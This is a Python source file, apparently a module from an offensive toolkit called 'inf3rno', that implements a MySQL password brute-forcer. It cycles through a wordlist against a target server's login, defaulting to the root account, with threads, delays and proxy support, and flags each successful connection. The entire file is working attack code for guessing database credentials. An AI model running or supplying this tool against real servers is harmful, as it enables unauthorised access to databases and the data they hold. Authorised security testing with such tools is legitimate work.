"""MySQL brute-force module."""

import pymysql
from inf3rno.core.bruteforce import BaseBrute


class MySQLBrute(BaseBrute):
    """MySQL brute-force implementation."""

    def __init__(self, target: str, port: int = 3306, username: str = "root",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "MySQL"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt MySQL login."""
        try:
            connection = pymysql.connect(
                host=self.target,
                port=self.port,
                user=username,
                password=password,
                connect_timeout=5,
            )
            connection.close()
            return True

        except pymysql.err.OperationalError as e:
            # Access denied error
            if "Access denied" in str(e):
                return False
            if self.verbose:
                print(f"[!] MySQL error for {username}:{password}: {e}")
            return False

        except Exception as e:
            if self.verbose:
                print(f"[!] Connection error: {e}")
            return False
